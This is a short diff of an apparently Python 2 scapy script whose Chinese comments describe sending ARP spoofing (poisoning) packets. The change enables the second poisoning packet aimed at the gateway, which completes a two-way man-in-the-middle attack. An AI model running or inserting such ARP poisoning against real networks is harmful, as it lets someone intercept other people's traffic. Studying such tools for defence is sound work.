@@ -105,7 +105,7 @@ class Nct():
             try:
                 # 开始发送ARP欺骗包(投毒)
                 send(poison_target)
-                #send(poison_gateway)
+                send(poison_gateway)
                 # 停两秒
                 print "send packet!"
                 time.sleep(2)
